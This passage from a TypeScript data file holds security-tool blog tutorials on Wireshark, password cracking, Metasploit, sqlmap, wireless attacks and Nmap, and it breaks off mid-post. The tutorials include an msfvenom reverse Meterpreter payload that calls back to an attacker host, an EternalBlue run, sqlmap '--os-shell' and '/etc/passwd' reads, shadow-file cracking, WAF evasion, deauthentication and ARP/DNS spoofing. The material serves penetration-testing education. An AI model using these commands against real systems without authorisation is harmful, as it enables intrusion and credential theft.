/**
 * Blog content — the single source of truth.
 *
 * This data used to exist in three places: here (inside the client component),
 * src/lib/blog-posts.ts, and again inside BlogSection.tsx. Three copies drifted
 * exactly as three copies do. In one sweep that produced: two posts sharing a
 * title, four posts with no metadata at all (so they rendered with the blog
 * index's title and shipped no schema), and every post overstating its read
 * time by between five and eighteen times.
 *
 * So the data lives here, once, with no "use client" and no JSX, and everything
 * else derives from it.
 */

export interface BlogPost {
  slug: string;
  title: string;
  category: string;
  date: string;
  author: string;
  excerpt: string;
  content: string;
  tags: string[];
}

/**
 * Minutes to read, computed from the post rather than asserted next to it.
 *
 * The hand-written numbers claimed 9 to 18 minutes for posts of 228 to 500
 * words — a "18 min read" label on roughly one minute of text. 225 words per
 * minute is the usual reading rate for technical prose; code blocks are
 * scanned rather than read, so they are counted at a third.
 */
export function estimateReadTime(content: string): number {
  const code = (content.match(/```[\s\S]*?```/g) || []).join(" ");
  const prose = content.replace(/```[\s\S]*?```/g, " ");
  const words = prose.split(/\s+/).filter(Boolean).length;
  const codeWords = code.split(/\s+/).filter(Boolean).length;
  return Math.max(1, Math.round((words + codeWords / 3) / 225));
}

export const BLOG_POSTS: Record<string, BlogPost> = {
  "mastering-wireshark": {
    slug: "mastering-wireshark",
    title: "Mastering Wireshark: Network Traffic Analysis Deep Dive",
    category: "Tools",
    date: "2026-01-15",
    author: "Semih Kilic",
    excerpt: "Advanced packet capture and analysis techniques — from protocol dissection to identifying malicious traffic patterns in real-time.",
    tags: ["wireshark", "network-analysis", "packet-capture", "traffic-analysis"],
    content: `
## Introduction

Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level. In this deep dive, we'll cover advanced techniques that go beyond basic packet capture.

## Setting Up Capture Filters

Before capturing traffic, it's crucial to set up proper capture filters to reduce noise:

\`\`\`
# Capture only HTTP/HTTPS traffic
tcp port 80 or tcp port 443

# Capture traffic from a specific subnet
net 192.168.1.0/24

# Capture DNS queries only
udp port 53
\`\`\`

## Display Filters for Forensic Analysis

Once you have captured data, display filters help you isolate relevant packets:

\`\`\`
# Find HTTP POST requests (potential data exfiltration)
http.request.method == "POST"

# Find DNS queries to suspicious TLDs
dns.qry.name contains ".xyz" or dns.qry.name contains ".top"

# Detect potential C2 beaconing (regular interval connections)
tcp.flags.syn == 1 && tcp.flags.ack == 0
\`\`\`

## Identifying Malicious Traffic Patterns

### 1. DNS Tunneling Detection
Look for unusually long DNS queries or high-frequency DNS requests to the same domain. DNS tunneling often uses TXT records with base64-encoded data.

### 2. Beaconing Analysis
C2 (Command and Control) traffic often shows regular intervals. Use the Statistics > Conversations feature to identify hosts with periodic connections.

### 3. Data Exfiltration Indicators
- Large outbound data transfers during off-hours
- Encrypted connections to non-standard ports
- HTTP POST requests with large payloads to unknown domains

## Protocol Dissection

Wireshark's protocol dissectors allow deep inspection of application-layer protocols. Custom dissectors can be written in Lua for proprietary protocols.

## TShark for Automated Analysis

For automated analysis pipelines, TShark (Wireshark's CLI) is invaluable:

\`\`\`bash
# Extract all HTTP URLs from a capture
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Count connections per source IP
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Export specific streams
tshark -r capture.pcap -Y "tcp.stream eq 5" -w stream5.pcap
\`\`\`

## Best Practices

1. **Always capture with proper authorization** — Unauthorized packet capture may violate laws
2. **Use ring buffers** for continuous monitoring to avoid disk space issues
3. **Encrypt your captures** as they may contain sensitive data
4. **Timestamp analysis** is crucial for incident response timelines
5. **Combine with other tools** like Zeek (Bro) for automated threat detection

## Conclusion

Mastering Wireshark requires practice and understanding of network protocols. Start with your own lab environment, analyze known-good traffic first, then gradually move to more complex scenarios. The key is understanding what "normal" looks like so you can identify anomalies.
    `,
  },
  "hashcat-vs-john": {
    slug: "hashcat-vs-john",
    title: "Hashcat vs John the Ripper: Password Cracking Compared",
    category: "Tools",
    date: "2026-01-12",
    author: "Semih Kilic",
    excerpt: "GPU-accelerated password recovery showdown. Benchmarks, rule-based attacks, and choosing the right tool for the job.",
    tags: ["hashcat", "john-the-ripper", "password-cracking", "GPU"],
    content: `
## Overview

Password cracking is an essential skill in penetration testing. Two tools dominate this space: **Hashcat** (GPU-focused) and **John the Ripper** (CPU-focused with GPU support). Let's compare them head-to-head.

## GPU vs CPU Performance

| Hash Type | Hashcat (RTX 4090) | John the Ripper (CPU) | Speed Ratio |
|-----------|--------------------|-----------------------|-------------|
| MD5 | 164 GH/s | 850 MH/s | 193x |
| SHA-256 | 22 GH/s | 320 MH/s | 69x |
| bcrypt | 184 kH/s | 45 kH/s | 4x |
| NTLM | 300 GH/s | 1.2 GH/s | 250x |

## Attack Modes

### Hashcat Attack Modes
- **Dictionary Attack** (-a 0): Straight wordlist attack
- **Combination Attack** (-a 1): Combine two wordlists
- **Brute-Force** (-a 3): Mask-based attack
- **Rule-Based** (-a 0 -r rules): Apply transformation rules
- **Hybrid** (-a 6, -a 7): Wordlist + mask combinations

### John the Ripper Modes
- **Single Crack**: Uses login names and GECOS info
- **Wordlist**: Dictionary with optional rules
- **Incremental**: Brute-force with character frequency optimization
- **External**: Custom cracking modes via C-like config

## When to Use Which

**Choose Hashcat when:**
- You have a powerful GPU
- Cracking large hash lists
- Need maximum speed for common hash types
- Working with modern hash algorithms

**Choose John the Ripper when:**
- Working with exotic/uncommon hash formats
- Need automatic hash detection
- Running on servers without GPUs
- Need incremental mode's smart brute-force

## Practical Example

\`\`\`bash
# Hashcat: Crack NTLM hashes with rockyou
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John: Crack shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=All /etc/shadow

# Hashcat: Mask attack for 8-char passwords
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?s
\`\`\`

## Conclusion

Both tools are essential in a penetration tester's arsenal. Use Hashcat for raw GPU power and John for versatility. Many professionals use both in their workflows.
    `,
  },
  "owasp-top-10-2026": {
    slug: "owasp-top-10-2026",
    title: "OWASP Top 10 in 2026: What's Changed",
    category: "Security",
    date: "2026-01-08",
    author: "Semih Kilic",
    excerpt: "An updated look at the most critical web application security risks and how to mitigate them with modern tools.",
    tags: ["OWASP", "web-security", "top-10", "application-security"],
    content: `
## The Evolving Threat Landscape

The OWASP Top 10 continues to evolve as web technologies advance. In 2026, several categories have shifted to reflect modern application architectures including microservices, serverless, and AI-integrated applications.

## Key Changes from 2021

### 1. AI/ML Security Risks (NEW)
With the proliferation of AI-powered applications, new attack vectors have emerged:
- **Prompt Injection** — Manipulating LLM inputs to bypass safety controls
- **Training Data Poisoning** — Compromising model training pipelines
- **Model Inversion** — Extracting sensitive training data from models

### 2. API Security Misconfigurations (Elevated)
APIs now account for over 80% of web traffic. Common issues include:
- Broken Object Level Authorization (BOLA)
- Excessive data exposure in API responses
- Missing rate limiting and resource quotas

### 3. Supply Chain Vulnerabilities (Elevated)
The software supply chain remains a critical attack surface:
- Dependency confusion attacks
- Compromised CI/CD pipelines
- Malicious package injection

## Mitigation Strategies

1. **Shift-Left Security**: Integrate security testing into CI/CD pipelines
2. **Zero Trust Architecture**: Never trust, always verify
3. **SBOM (Software Bill of Materials)**: Track all dependencies
4. **AI Security Testing**: Specialized tools for LLM applications
5. **API Gateway Security**: Centralized API protection

## Using CyberSec Pro for OWASP Testing

CyberSec Pro's automated scanning engine covers all OWASP Top 10 categories with tools like:
- **Nikto** for web server misconfiguration detection
- **SQLMap** for injection testing
- **OWASP ZAP** for comprehensive web app scanning
- **Nuclei** for template-based vulnerability detection

## Conclusion

Stay ahead of threats by continuously testing your applications against the latest OWASP guidelines. Automated tools combined with manual testing provide the best coverage.
    `,
  },
  "metasploit-zero-to-exploit": {
    slug: "metasploit-zero-to-exploit",
    title: "Getting Started with Metasploit: Your First Exploit",
    category: "Tutorials",
    date: "2026-01-05",
    author: "Semih Kilic",
    excerpt: "From an empty msfconsole to a live session: the five module types, why reverse payloads call home to your LHOST, building standalone payloads with msfvenom, and why you check before you exploit.",
    tags: ["metasploit", "exploitation", "penetration-testing", "msfvenom"],
    content: `
## What Metasploit actually is

Newcomers meet Metasploit as "the tool that runs exploits", which is true and also the least interesting thing about it. What makes it the framework every other pentest tool measures itself against is that it turns four separate jobs — knowing which exploit fits a target, delivering it, catching the connection that comes back, and doing something useful with that connection — into four kinds of interchangeable module that snap together. Learn how the pieces fit and you can reason about any of the thousands of modules you have never seen, instead of memorising commands.

This guide takes you from an empty \`msfconsole\` to a live session on a lab target. What you do *with* that session — privilege escalation, credential theft, pivoting to the next host — is the subject of the companion guide on Meterpreter and post-exploitation.

## The five module types

Everything in the framework is one of these, and the whole workflow is a matter of choosing one of each that you need:

- **Exploits** take advantage of a specific vulnerability. \`exploit/windows/smb/ms17_010_eternalblue\` is one flaw, in one protocol, on one platform.
- **Payloads** are the code that runs *after* the exploit lands — a shell, or the far more capable Meterpreter.
- **Auxiliary** modules do everything that is not exploitation: port and version scanning, fuzzing, brute-forcing, protocol enumeration. You will often use an auxiliary scanner before any exploit.
- **Post** modules run inside a session you already have, to escalate, harvest or pivot.
- **Encoders** and **nops** reshape a payload's bytes. Their historical job was evading signature-based antivirus; against a modern EDR they rarely help on their own, and it is worth having that expectation from the start.

The important idea is that exploit and payload are chosen *separately*. The same EternalBlue exploit can deliver a simple command shell, a Meterpreter session, or a payload that just adds a user — because the exploit's job ends the moment it gets code running, and the payload's job begins there.

## Reverse versus bind: which way the connection goes

Before the first exploit, one distinction saves a lot of confusion. A payload named \`reverse_tcp\` makes the *target* connect back to *you*; a \`bind_tcp\` payload opens a port on the target and waits for you to connect *in*. Reverse is the default for a reason: outbound connections usually survive a firewall that blocks inbound ones. This is why a reverse payload needs \`LHOST\` (your address, for the target to reach) while a bind payload needs only \`RHOST\`. Getting these backwards is the single most common reason a beginner's exploit "succeeds" but no session appears.

## Your first exploit, step by step

\`\`\`bash
# 1. Start the console.
msfconsole

# 2. Find something that fits the target.
msf6 > search type:exploit platform:windows smb

# 3. Select it. The prompt changes to show the active module.
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. See what it needs.
msf6 exploit(ms17_010_eternalblue) > show options

# 5. Point it at the target.
msf6 exploit(...) > set RHOSTS 192.168.56.101

# 6. Choose a payload, and tell it where to call home.
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.56.1

# 7. Sanity-check before firing.
msf6 exploit(...) > check
msf6 exploit(...) > exploit
\`\`\`

Two of these steps are the ones people skip and then regret. \`show options\` lists every required field — miss one and the exploit fails with a message that does not always name the missing field. And \`check\`, which many exploits support, asks the target whether it is likely vulnerable *without* firing the exploit. On a fragile production system, a failed EternalBlue attempt can blue-screen the host; \`check\` first is the difference between a finding and an outage you have to explain.

## Reading what comes back

A successful run ends with a line like:

\`\`\`
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:49512)
\`\`\`

If you instead see the exploit complete with no session, the usual causes are, in order: the payload could not reach \`LHOST\` (wrong address, or a firewall between you and the target), the target was patched and the exploit simply failed, or you chose a payload architecture that does not match the target — a \`x64\` payload against a 32-bit process, for instance. \`set PAYLOAD\` mismatches are quiet failures, so when in doubt, start with the generic \`windows/meterpreter/reverse_tcp\` and let the framework sort the architecture out.

You do not have to hold the exploit open. \`background\` (or Ctrl+Z) drops the session into the background and returns you to the console, where \`sessions -l\` lists them and \`sessions -i 1\` resumes one.

## Payloads you build ahead of time: msfvenom

Not every payload is delivered by an exploit. Often you need a standalone file — something to drop on a target you already have limited access to, or to use in a phishing exercise that is inside your engagement's scope. \`msfvenom\` builds those:

\`\`\`bash
# A Windows executable that calls back to you.
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe
\`\`\`

Run it and the tool reports what it produced:

\`\`\`
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
\`\`\`

The \`-f\` format is the whole point of msfvenom: the same payload can come out as an \`exe\`, a \`dll\`, an \`elf\` for Linux, a \`.jar\`, an \`aspx\` web shell, raw shellcode, and around forty other formats. You pick the one that fits how you will deliver it. A payload built this way needs something on your side to catch the connection — which is the next piece.

## The multi/handler: catching what you sent

When the payload is delivered by msfvenom rather than by a live exploit, you run a listener yourself:

\`\`\`bash
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 10.0.0.5
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j
\`\`\`

The payload in the handler must match the payload you built with msfvenom, down to the architecture and the \`LPORT\` — the handler is the other end of the same phone line. \`-j\` runs it as a background job so you can keep working while it waits for the call.

## Practise legally, from the first command

Everything above is illegal against a system you do not own or have written permission to test, and "I was learning" is not a defence. Build a lab instead — it is the fastest way to learn and the only safe one:

- **Metasploitable 2/3**, VMs the Metasploit project maintains specifically as legal targets.
- **VirtualBox or VMware** on your own machine, with a host-only network so nothing you launch can leave it.
- A **HackTheBox** or **TryHackMe** subscription, which give you sanctioned targets and a guided path.

EternalBlue against your own Metasploitable VM teaches you the same workflow you will use on a real engagement, with none of the legal exposure.

## Running Metasploit without maintaining it

Keeping a current Metasploit install, a payload toolkit and a lab network on your own machine is real work, and doing it is a legitimate way to learn the tool deeply. If you would rather not, CyberSec Pro runs Metasploit's modules from a browser — you choose the module and set its options on a form, see the command before it runs, and watch the output stream back. The job runs server-side in a dedicated container, one process per job, and any credentials you provide are held in memory for that job alone.

Either way, the mental model is what carries over: exploit and payload are separate choices, reverse connections come back to your \`LHOST\`, and you \`check\` before you \`exploit\`. Once you have a session open, the companion guide picks up from there.
    `,
  },
  "ci-cd-pentest-automation": {
    slug: "ci-cd-pentest-automation",
    title: "Automating Penetration Tests with CI/CD",
    category: "DevSecOps",
    date: "2026-01-03",
    author: "Semih Kilic",
    excerpt: "Integrate security testing into your development pipeline with CyberSec Pro's API and GitHub Actions.",
    tags: ["CI/CD", "automation", "DevSecOps", "GitHub-Actions"],
    content: `
## Why Automate Security Testing?

Manual penetration testing is thorough but slow. By integrating automated security scans into your CI/CD pipeline, you can:
- **Catch vulnerabilities early** in the development lifecycle
- **Reduce remediation costs** (fixing in dev is 10x cheaper than production)
- **Ensure continuous compliance** with security standards
- **Scale security testing** across multiple projects

## CyberSec Pro API Integration

\`\`\`yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger CyberSec Pro Scan
        run: |
          curl -X POST https://api.cyber-sec-pro.com/v1/scans \\
            -H "Authorization: Bearer \${{ secrets.CYBERSEC_API_KEY }}" \\
            -H "Content-Type: application/json" \\
            -d '{
              "target": "\${{ github.event.repository.homepage }}",
              "tool_id": "nikto",
              "options": {"tuning": "1234567890"}
            }'
\`\`\`

## Pipeline Architecture

1. **Pre-commit**: Secret scanning, dependency audit
2. **Build**: SAST (Static Analysis), container scanning
3. **Deploy (Staging)**: DAST (Dynamic Analysis) with CyberSec Pro
4. **Post-Deploy**: Continuous monitoring, vulnerability alerts

## Best Practices

- Never block deployments on informational findings
- Set severity thresholds (block on Critical/High only)
- Keep scan results in a centralized dashboard
- Automate ticket creation for new vulnerabilities
- Schedule weekly full scans in addition to pipeline scans

## Conclusion

DevSecOps is not optional — it's essential. Start small with automated dependency checks, then gradually add DAST and infrastructure scanning to your pipeline.
    `,
  },
  "wireless-security-assessment": {
    slug: "wireless-security-assessment",
    title: "Wireless Security Assessment Best Practices",
    category: "Wireless",
    date: "2025-12-15",
    author: "Semih Kilic",
    excerpt: "Comprehensive guide to testing Wi-Fi network security using aircrack-ng, wifite, and bettercap.",
    tags: ["wireless", "WiFi", "aircrack-ng", "wifite", "bettercap"],
    content: `
## Wireless Security Testing Methodology

Wireless networks present unique attack surfaces. This guide covers the essential tools and techniques for assessing Wi-Fi security.

## Essential Tools

### Aircrack-ng Suite
The foundational toolkit for wireless assessment:

\`\`\`bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake for specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (to capture handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
\`\`\`

### Wifite (Automated)
For rapid assessment of multiple networks:

\`\`\`bash
# Automated scan and attack
wifite --kill --no-reaver

# Target specific encryption
wifite --wpa --dict /path/to/wordlist.txt
\`\`\`

### Bettercap (MITM)
For man-in-the-middle testing:

\`\`\`bash
# Start bettercap
bettercap -iface wlan0

# ARP spoofing
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on

# DNS spoofing
> set dns.spoof.domains example.com
> dns.spoof on
\`\`\`

## Assessment Checklist

1. **Encryption Strength**: WPA3 > WPA2-AES > WPA2-TKIP > WEP (never use)
2. **SSID Security**: Disable SSID broadcast in sensitive environments
3. **Client Isolation**: Prevent lateral movement between wireless clients
4. **Rogue AP Detection**: Monitor for evil twin attacks
5. **802.1X/RADIUS**: Enterprise authentication for corporate networks

## Legal Warning

**Wireless testing must only be performed on networks you own or have explicit written permission to test.** Unauthorized wireless access is a criminal offense in most jurisdictions.

## Conclusion

Regular wireless security assessments are essential for any organization. Combine automated scanning with manual testing for comprehensive coverage.
    `,
  },

  "sqlmap-injection-guide": {
    slug: "sqlmap-injection-guide",
    title: "SQLMap: Automated SQL Injection Testing Guide",
    category: "Tools",
    date: "2026-03-10",
    author: "Semih Kilic",
    excerpt: "Why the injection technique in the first result sets the pace of the whole engagement, how to test the request the app actually accepted, and which flags will damage a live system.",
    tags: ["sqlmap", "sql-injection", "web-security", "penetration-testing"],
    content: `
## What sqlmap does that a manual test does not

You can find a SQL injection by hand: put a quote in a parameter, watch the page break, work out the query behind it. sqlmap does that too, but the reason to reach for it is not detection — it is the part *after* detection. Once it confirms an injectable parameter, it fingerprints the database, works out how to read data through the specific flaw it found, and enumerates schemas and tables without you writing a single \`UNION SELECT\`. The tedious, error-prone part is the part it automates.

That is also why it is dangerous to point casually at a live system. sqlmap is not a scanner that looks and leaves; by default it will extract data, and with the wrong flag it will try to run commands on the host. Everything below assumes you have written authorisation for the target, and the last section is about staying inside that authorisation.

## The first command, and reading its answer

\`\`\`
sqlmap -u "https://target.example.com/product?id=1"
\`\`\`

That tests the \`id\` parameter and nothing else. sqlmap sends a series of crafted values and watches how the responses differ — a payload that changes the page one way, its logical opposite that changes it back. What you are waiting for is a line like:

\`\`\`
[INFO] GET parameter 'id' is 'MySQL >= 5.6 AND time-based blind' injectable
\`\`\`

Read that carefully, because it tells you two things that shape everything after. The DBMS — MySQL here — decides which enumeration commands are available. And the **technique** — time-based blind — decides how slow the rest of your session will be. A \`UNION\`-based injection returns data in the page and is fast. A time-based blind injection extracts data one bit at a time by making the database sleep, and dumping a large table that way can take hours. If sqlmap reports only a time-based flaw, that is not a warning you can ignore; it is the pace of the entire engagement.

## Injection points beyond the query string

Most parameters worth testing are not in the URL.

\`\`\`
# POST body
sqlmap -u "https://target.example.com/login" \\
  --data="username=admin&password=test"

# A specific parameter, when the request has many
sqlmap -u "https://target.example.com/search" \\
  --data="q=shoes&sort=price&page=2" -p q

# An authenticated session — the injection is usually behind the login
sqlmap -u "https://target.example.com/account?tab=orders" \\
  --cookie="session=8f3a...; role=user"

# A value inside a header, marked with *
sqlmap -u "https://target.example.com/" \\
  --headers="X-Forwarded-For: 1.1.1.1*"
\`\`\`

The single most useful input, though, is not a flag at all. Capture the real request in Burp or your browser's dev tools, save it to a file, and hand sqlmap the whole thing:

\`\`\`
sqlmap -r request.txt
\`\`\`

Now sqlmap tests with the exact headers, cookies and body the application already accepted. This solves the most common "it works by hand but sqlmap finds nothing" problem, which is almost always a missing header, a CSRF token, or a session cookie that the manual test had and the tool did not.

## Level and risk: the two dials that matter

\`\`\`
sqlmap -u URL --level=1 --risk=1    # the default
sqlmap -u URL --level=3 --risk=2    # a reasonable step up
sqlmap -u URL --level=5 --risk=3    # everything, including the payloads that can hurt
\`\`\`

\`--level\` (1–5) widens *where* sqlmap looks: higher levels test more parameters, and crucially, levels 2 and 3 start testing cookies and headers that the default leaves alone. \`--risk\` (1–3) changes *what* it sends. This is the dial to respect. Risk 3 includes \`OR\`-based boolean payloads, and an \`OR\`-based injection into an \`UPDATE\` statement can match every row in a table — which on a live application means editing every record, not reading one. The default of \`--level=1 --risk=1\` is not timidity; it is what you run against a system you cannot afford to damage.

Raise the level first when detection is coming up empty. Raise the risk only when you understand what the extra payloads do and the target can absorb the consequence.

## Enumeration, from database down to rows

Once a parameter is confirmed injectable, you walk down the tree:

\`\`\`
sqlmap -r request.txt --dbs                       # which databases exist
sqlmap -r request.txt -D shopdb --tables          # tables in one of them
sqlmap -r request.txt -D shopdb -T users --columns# columns in one table
sqlmap -r request.txt -D shopdb -T users \\
  -C username,password_hash --dump                # just the columns you need
\`\`\`

Notice the last command names two columns. The instinct is \`--dump\` on the whole table, or worse \`--dump-all\` across every database. Over a time-based blind injection that is the difference between a two-minute extraction and one that runs overnight and gets you noticed. Take the schema first, decide what actually proves the finding — usually a handful of rows and the columns that show the data is real — and pull only that. A penetration test demonstrates access; it does not need to exfiltrate the customer table to do so.

\`--current-user\`, \`--current-db\`, \`--is-dba\` and \`--passwords\` answer "how bad is this" quickly and cheaply, and they are a better opening move than dumping anything.

## When there is a WAF in the way

A web application firewall that blocks obvious payloads is common, and sqlmap has room to work around it — legitimately, on a target you are authorised to test.

\`\`\`
sqlmap -r request.txt --random-agent
sqlmap -r request.txt --tamper=space2comment,between --random-agent
sqlmap -r request.txt --delay=1 --safe-url=https://target.example.com/ --safe-freq=10
\`\`\`

Tamper scripts rewrite payloads into forms a filter may not recognise — \`space2comment\` replaces spaces with inline comments, \`between\` rewrites \`>\` comparisons, and there are dozens more for specific filters. \`--random-agent\` avoids the default sqlmap user-agent that many WAFs block on sight. And \`--delay\` with \`--safe-url\`/\`--safe-freq\` slows the session and periodically hits a harmless page, which both reduces load and makes the traffic look less like a machine hammering one endpoint. This is evasion in the service of a sanctioned test; the same techniques against a system you do not own are simply an attack.

## The commands to think twice about

\`\`\`
sqlmap -r request.txt --os-shell       # command execution on the DB host
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --sql-shell       # an interactive SQL prompt
\`\`\`

\`--os-shell\` is where sqlmap stops reading the database and starts trying to run operating-system commands on the server behind it — by writing a payload to disk, abusing a stored procedure, or a similar path depending on the DBMS. When it works it is the strongest possible demonstration of impact. It is also the loudest thing in the tool, it writes files to the target, and it will trip any monitoring worth the name. On a real engagement, run it only when the rules of engagement explicitly permit command execution, and know that "explicitly permit" means it is written in the scope document, not that nobody said you couldn't.

## Sessions, batch mode, and not repeating work

\`\`\`
sqlmap -r request.txt --batch                     # take the default at every prompt
sqlmap -r request.txt --dbs --flush-session       # start clean, ignore the cache
\`\`\`

sqlmap caches what it learns in a per-target session file, so a second run does not re-detect an injection it already found — it picks up where it left off. \`--batch\` answers every interactive prompt with the sensible default, which is what you want in a script or a long enumeration you don't intend to babysit. Reach for \`--flush-session\` only when you have changed something about the target or the test and want sqlmap to stop trusting its cache.

## A short checklist before you run it in anger

- The target is in a written scope, and data extraction (and, separately, command execution) is permitted by that document.
- You are testing with \`-r request.txt\` from a real captured request, so authentication and headers match.
- You start at \`--level=1 --risk=1\` and raise deliberately, not reflexively.
- You enumerate the schema before dumping, and dump the columns that prove the finding rather than the whole database.
- You practise against a deliberately vulnerable app first — DVWA, OWASP Juice Shop, or the \`testphp.vulnweb.com\` target Acunetix publishes for exactly this — before you touch anything real.

## Running it without the local install

sqlmap is a Python tool and installs cleanly, and running it yourself is a fine way to work. If you would rather not manage a Python environment and a WAF-evasion toolkit on your own machine, CyberSec Pro runs sqlmap from a browser: you fill in the target and options on a form, see the exact command before it runs, and the output streams back as it happens. The scan executes server-side in a dedicated container, one process per job, and credentials you supply for an authenticated test are held in memory for that job and never written to the database, logs or backups.

Whichever way you run it, the discipline is the same. Read the technique in the first result, enumerate before you dump, and never send a risk-3 payload at something you cannot afford to break.
    `,
  },
  "nmap-network-scanning": {
    slug: "nmap-network-scanning",
    title: "Nmap: Complete Network Scanning & Discovery Guide",
    category: "Tools",
    date: "2026-02-28",
    author: "Semih Kilic",
    excerpt: "Why your scan found nothing, what the six port states actually mean, and the two-pass workflow that scales past one host. With real output from a host we control.",
    tags: ["nmap", "network-scanning", "port-scanning", "reconnaissance"],
    content: `
## What Nmap is actually telling you

Nmap sends packets and reports what came back. That sounds obvious, and it is the single most useful thing to keep in mind, because every line of output is an *inference* drawn from a response — or from the absence of one. A port marked \`open\` means a probe got an acknowledgement. A port marked \`filtered\` means nothing came back at all, and Nmap cannot tell you whether that is a firewall, a dropped packet, or a host that stopped answering because you scanned it too fast.

Most bad scan results come from forgetting this. The tool is not reading the target's configuration; it is guessing from the outside, and it will tell you how confident it is if you read carefully.

## Your first scan, and what the default quietly leaves out

\`\`\`
nmap scanme.nmap.org
\`\`\`

That scans **1,000 TCP ports**, not 65,535. They are the thousand ports Nmap's authors found most often open in a large internet survey, and they catch the overwhelming majority of real services. They also miss the interesting ones: an admin panel on 8443, a forgotten Redis on 6379, a debug listener someone left on 31337.

So the default is the right first scan and the wrong last one:

\`\`\`
# Every TCP port. Slower, and the one that finds the surprises.
nmap -p- target.example.com

# A middle ground — the 3,000 most common.
nmap --top-ports 3000 target.example.com

# Exactly what you care about.
nmap -p 22,80,443,8080,8443 target.example.com
\`\`\`

If you only ever run one command against a host you are responsible for, make it \`-p-\`. Every "we didn't know that was exposed" incident starts with a scan that stopped at 1,000.

## When a scan finds nothing: host discovery

Before touching a single port, Nmap decides whether the host is even up. On a local network that is an ARP request; across the internet it is a mix of ICMP echo, a TCP ACK to 80, a SYN to 443, and an ICMP timestamp request. If none of those come back, Nmap declares the host down and **never scans it**.

Plenty of production hosts drop all of it. That produces the most common false conclusion in network scanning: "the host is down", when it is serving traffic perfectly well.

\`\`\`
# Skip discovery. Treat the host as up and scan it regardless.
nmap -Pn target.example.com

# The opposite: discovery only, no port scan. A fast inventory sweep.
nmap -sn 10.0.0.0/24
\`\`\`

\`-sn\` over a /24 is the fastest honest answer to "what is actually on this network". Run it first, then scan what it finds.

## Choosing a scan type

\`\`\`
nmap -sS target    # SYN scan — needs root
nmap -sT target    # TCP connect — works unprivileged
nmap -sU target    # UDP — a different animal entirely
\`\`\`

**\`-sS\`** sends a SYN, waits for the SYN/ACK, and sends a RST instead of completing the handshake. It is the default *when you have privileges*, because it is faster and because the connection never completes, so many applications never log it. It needs raw sockets, which means root or \`CAP_NET_RAW\`.

**\`-sT\`** asks the operating system to open a real connection. It works without privileges and it is what Nmap silently falls back to if you forget \`sudo\`. The handshake completes, so the target's application logs see a connection from you. If you are scanning without privileges and wondering why the target noticed, this is why.

**\`-sU\`** is the one people skip, and skipping it is how DNS, SNMP, NTP and IKE stay invisible in reports. UDP has no handshake: a closed port answers with ICMP port-unreachable, an open port usually answers with nothing at all — which looks identical to a firewall drop. Nmap has to wait out a timeout on every non-responsive port, and Linux rate-limits the ICMP replies it depends on. A full UDP scan of 65,535 ports can genuinely take hours. Scope it:

\`\`\`
nmap -sU --top-ports 100 target.example.com
\`\`\`

## Six port states, not two

This is where most reports go wrong. Nmap has six states and people read only two of them.

| State | What it means |
|---|---|
| \`open\` | Something is listening and it answered |
| \`closed\` | The host answered and refused — the host is up, nothing is on that port |
| \`filtered\` | Nothing came back. A firewall is probably dropping your probe |
| \`unfiltered\` | Reachable, but Nmap cannot tell open from closed (ACK scans) |
| \`open\\|filtered\` | No answer, and for this scan type that is ambiguous (common on UDP) |
| \`closed\\|filtered\` | Ambiguity between closed and filtered (idle scans) |

\`closed\` and \`filtered\` are not synonyms, and the difference matters more than it looks. A host that returns \`closed\` for 999 ports and \`filtered\` for one is telling you that one port is being deliberately protected — which is usually the interesting one. A host that returns \`filtered\` for everything is behind a default-deny firewall and your scan is measuring the firewall, not the host.

## Version detection is a guess, with a confidence level

\`\`\`
nmap -sV target.example.com
nmap -sV --version-intensity 9 target.example.com   # try every probe
nmap -A target.example.com                          # -sV, -sC, -O and traceroute
\`\`\`

\`-sV\` connects and compares what the service says against a fingerprint database of thousands of signatures. When the service is chatty, the result is excellent. When it isn't, the result is thin — and thin is the correct answer, not a failure.

Here is a scan against a host we control, so we can compare the output to the configuration behind it:

\`\`\`
PORT     STATE  SERVICE       VERSION
80/tcp   open   http          nginx
3389/tcp open   ms-wbt-server Microsoft Terminal Service
\`\`\`

Nginx is reported with no version at all. That is not Nmap giving up — it is \`server_tokens off\` in the nginx configuration, which strips the version from the \`Server\` header. Nmap reported exactly as much as the service was willing to say. If you are on the defending side, that line is what a hardened banner is supposed to look like.

\`-A\` is the convenient bundle: version detection, the default script set, OS detection and a traceroute. It is also loud and slow. Use it when you have already decided a host is worth the attention, not as your opening move.

## NSE: the part that gets skipped

The Nmap Scripting Engine is where the tool stops being a port scanner. Roughly 600 scripts ship with it, grouped into categories.

\`\`\`
nmap -sC target                           # the "default" category
nmap --script vuln target                 # known-vulnerability checks
nmap --script ssl-enum-ciphers -p 443 t   # every cipher suite the TLS stack offers
nmap --script http-enum -p 80,443 target  # common paths and admin panels
nmap --script smb-os-discovery -p 445 t   # Windows host details over SMB
\`\`\`

